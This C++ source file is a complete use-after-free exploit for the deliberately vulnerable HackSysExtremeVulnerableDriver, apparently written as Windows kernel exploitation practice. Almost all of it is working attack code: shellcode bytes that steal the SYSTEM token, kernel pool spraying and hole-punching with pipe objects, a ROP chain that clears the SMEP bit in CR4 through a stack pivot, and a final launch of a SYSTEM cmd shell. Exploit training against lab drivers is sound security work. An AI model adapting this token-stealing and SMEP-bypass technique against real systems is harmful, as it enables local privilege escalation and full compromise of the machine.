// HEVD-UAF.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <system_error>


// IOCTL Codes used for exploitation
#define UAF_ALLOC_IOCTL		 0x222013               
#define UAF_USE_IOCTL		 0x222017               
#define UAF_FREE_IOCTL		 (0x222003 + 24)
#define UAF_ALLOC_FAKE_IOCTL 0x22201f

// Some definitions to ease exploitation
#define QWORD ULONGLONG
typedef void (*FunctionPointer)(void);

// We use this instead of `_FAKE_OBJECT_NON_PAGED_POOL` as it has the actual used format
// with the FunctionPointer
typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
{
    FunctionPointer Callback;
    CHAR Buffer[0x54];
} USE_AFTER_FREE_NON_PAGED_POOL, * PUSE_AFTER_FREE_NON_PAGED_POOL;


struct PipeHandles {
    HANDLE read;
    HANDLE write;
};


// https://www.vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/
/*
 * Shellcode which steals the TOKEN of PID 4 and injects it into our process,
 * afterwards jumps back to userland to skip stack-cleanup (otherwise BSOD)
 *
[BITS 64]
start:
  mov rax, [gs:0x188]       ; KPCRB.CurrentThread (_KTHREAD)
  mov rax, [rax + 0xb8]     ; APCState.Process (current _EPROCESS)
  mov r8, rax               ; Store current _EPROCESS ptr in RBX

loop:
  mov r8, [r8 + 0x448]      ; ActiveProcessLinks
  sub r8, 0x448             ; Go back to start of _EPROCESS
  mov r9, [r8 + 0x440]      ; UniqueProcessId (PID)
  cmp r9, 4                 ; SYSTEM PID?
  jnz loop                  ; Loop until PID == 4

replace:
  mov rcx, [r8 + 0x4b8]      ; Get SYSTEM token
  and cl, 0xf0               ; Clear low 4 bits of _EX_FAST_REF structure
  mov [rax + 0x4b8], rcx     ; Copy SYSTEM token to current process

;; https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html
cleanup:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
  xor eax, eax  ;
  swapgs
  o64 sysret
 */

BYTE sc[256] = {
  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
  0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
  0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
  0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
  0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
  0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
  0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
  0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
  0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};



void Error(const char* msg) {
    printf("[!] Error: %s\n", msg);
    ExitProcess(-1);
}


QWORD getBaseAddr(LPCWSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        WCHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (wcscmp(szDrivers, drvName) == 0) {
                    return (QWORD)drivers[i];
                }
            }
        }
    }
    return 0;
}


/* Battle Plan:
* 1. Alloc a lot of 0x70 (112) byte objects from userspace to fit in the same "bucket"
* 
* : kd> !poolused 1 Hack
Using a machine size of 1f9e5f pages to configure the kd cache
..
 Sorting by Tag

                            NonPaged                                         Paged
 Tag       Allocs       Frees      Diff         Used       Allocs       Frees      Diff         Used

 Hack           1           0         1          112            0           0         0            0	UNKNOWN pooltag 'Hack', please update pooltag.txt

TOTAL           1           0         1          112            0           0         0            0

* 2. Free around every second object of the ones allocated at step one
* 3. Allocate UaF object
* 4. Free UaF object
* 5. Alloc Fake object multiple times to increaes chance of hitting the free'd UaF object
* 6. Trigger UaF usage for RCE

*/
void uaf() {
    HANDLE handle = INVALID_HANDLE_VALUE;
    // Get händel
    handle = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (handle == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Error getting handle to driver - CreateFileW" << std::endl;
        return;
    }

    DWORD bytesReturned;

    // Allocate actual/vulnerable UaF object
    BOOL status = DeviceIoControl(handle, UAF_ALLOC_IOCTL, NULL, NULL, NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
    if (!status) {
        // Commented out as it throws an error for successful execution anyway
        //Error("alloc_uaf()");
    }

    // Free the vulnerable UaF object
    status = DeviceIoControl(handle, UAF_FREE_IOCTL, NULL, 0, NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
    if (!status) {
        Error("free_uaf()");
    }



    //////////////

    // Actually just reuse the code from TypeConfusion to shift the stack,
    // disable SMEP and then execute token stealing shellcode and jmp into cmd.exe

    // 0x1409fa450: mov esp, 0x8B0009FB ; ret ; (1 found)
    QWORD STACK_PIVOT_ADDR = 0x8B0009FB;

    // -0x1000 to leave some space before our actual stack addr
    LPVOID stack_buf = VirtualAlloc((VOID*)(STACK_PIVOT_ADDR - 0x1000), 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    VOID* shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!VirtualLock(stack_buf, 0x14000)) {
        printf("Error using VirtualLock: %d\n", GetLastError());
    }

    // Make sure allocations succeeded
    if (!stack_buf || !shellcode) {
        std::cout << "[!] Error - uaf(): VirtualAlloc()" << std::endl;
        return;
    }

    memcpy(shellcode, sc, sizeof(sc));

    // Get Kernel base for ROP Chain
    // getBaseAddr() uses GetEnumDeviceDrivers
    QWORD kernelBase = getBaseAddr(L"ntoskrnl.exe");
    if (!kernelBase) {
        std::cout << "[!] Error - getBaseAddr()" << std::endl;
        return;
    }


    // C:\Users\test7\Desktop\tools\rp-win>rp-win.exe --unique -f C:\Windows\System32\ntoskrnl.exe -r 4 > ntoskrnl.exe.txt
    QWORD mov_cr4_rdx = kernelBase + 0xa7eb57;
    QWORD pop_rdx = kernelBase + 0xa80903;

    //0x1402ce4c0: mov esp, 0x48000000; add esp, 0x28; ret; (1 found)

    QWORD stack_pivot_gadget = kernelBase + 0x9fa450;
    printf("[*] Stack Pivot Gadget @0x%llx\n> ", stack_pivot_gadget);
    //getchar();

    // Got this by breaking in the running system and then doing a `r cr4`
    QWORD cr4 = 0x00000000003506f8;
    // Clear the 20th bit of CR4 to disable SMEP
    cr4 &= ~(1UL << 20);



    int idx = 0;
    QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);


    *(rop + idx++) = pop_rdx;
    *(rop + idx++) = cr4;
    *(rop + idx++) = mov_cr4_rdx;
    *(rop + idx++) = (QWORD)shellcode;


    /////////////



    // Alloc Fake UaF objects with our evil RIP value
    // We alloc 50k to increase the chances of hitting the UaF-Free'd object
    for (int i = 0; i < 50000; i++) {
        USE_AFTER_FREE_NON_PAGED_POOL inBuf;
        CHAR outBuf;
        DWORD bytesReturned;

        inBuf.Callback = (FunctionPointer)stack_pivot_gadget;
        memset(inBuf.Buffer, 0x42, sizeof(inBuf.Buffer) - 1);
        inBuf.Buffer[sizeof(inBuf.Buffer) - 1] = 0x00;

        status = DeviceIoControl(handle, UAF_ALLOC_FAKE_IOCTL, &inBuf, sizeof(inBuf), &outBuf, sizeof(outBuf), &bytesReturned, (LPOVERLAPPED)NULL);
        if (!status) {
            Error("alloc_fake_uaf()");
        }
    }



    // Exploit UaF through invoking the usage of our evil object
    // bp hevd+087C70
    status = DeviceIoControl(handle, UAF_USE_IOCTL, NULL, 0, NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
    if (!status) {
        Error("use_uaf()");
    }
}



PipeHandles create_pipe_obj() {
    UCHAR payload[0x28]; // 0x70 (112) - 0x48 (header size)
    PipeHandles pHandles;

    DWORD resultLen;

    BOOL res = CreatePipe(&pHandles.read,
        &pHandles.write,
        NULL,
        sizeof(payload));

    // Todo: make correct error handling
    if (res == FALSE) {
        Error("create_pipe_obj() - CreatePipe");
    }

    res = WriteFile(pHandles.write,
                    payload,
                    sizeof(payload),
                    &resultLen,
                    NULL);

    // Todo: make correct error handling
    if (res == FALSE) return pHandles;

    return pHandles;
}

void spray_pool(PipeHandles pHandles[], size_t sizeof_pHandles) {
    for (size_t i = 0; i < sizeof_pHandles; i++) {
        pHandles[i] = create_pipe_obj();
        // printf("[>] Handles: 0x%llx, 0x%llx\n", pHandles[i].read, pHandles[i].write);
    }
}

// Create holes in kernel pool
// Every second object is to be freed
// Range of objects to be freed is 20000-80000
void create_holes(PipeHandles pHandles[], size_t sizeof_pHandles) {
    for (size_t i = 20000; i < sizeof_pHandles; i++) {
        if (i % 2 == 0) {
            CloseHandle(pHandles[i].read);
            CloseHandle(pHandles[i].write);
        }
    }
}


int main()
{
	
    //test();
    //
    const size_t  n_spray_objects = 80000;
    PipeHandles* pHandles = NULL;
    pHandles = (PipeHandles*)VirtualAlloc(NULL, n_spray_objects*sizeof(PipeHandles), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pHandles) {
        std::cout << "[!] Error VirtualAlloc for pHandles." << std::endl;
        return -1;
    }


    printf("[*] Spraying Kernel Pool...\n");
    spray_pool(pHandles, n_spray_objects);

    printf("[*] Finished spraying the pool through CreatePipe() and WriteFile()\n");
    //getchar();
    //DebugBreak();

    create_holes(pHandles, n_spray_objects);

    //std::cout << "> After create_holes() before uaf().\n> Continue ?" << std::endl;
    //getchar();

    uaf();

    system("cmd");


    return 0;


}
